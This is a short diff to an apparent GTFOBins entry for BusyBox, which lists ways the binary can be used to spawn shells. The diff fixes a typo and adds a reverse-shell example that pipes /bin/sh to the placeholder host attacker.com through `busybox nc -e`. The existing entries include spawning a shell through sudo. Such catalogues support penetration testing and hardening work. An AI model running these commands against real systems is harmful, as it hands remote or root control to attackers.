@@ -1,5 +1,5 @@
 ---
-description: BusyBox may contain many UNIX utilities, run `busybox --list-full` to check what GTFBins binaries are supported. Here some example.
+description: BusyBox may contain many UNIX utilities, run `busybox --list-full` to check what GTFOBins binaries are supported. Here some example.
 functions:
   shell:
     - code: busybox sh
@@ -21,4 +21,10 @@ functions:
       code: "./busybox sh"
   sudo:
     - code: sudo busybox sh
+  reverse-shell:
+    - description: Run `nc -lvp 12345` on the attacker box to receive the shell.
+      code: |
+        RHOST=attacker.com
+        RPORT=12345
+        busybox nc -e /bin/sh $RHOST $RPORT
 ---
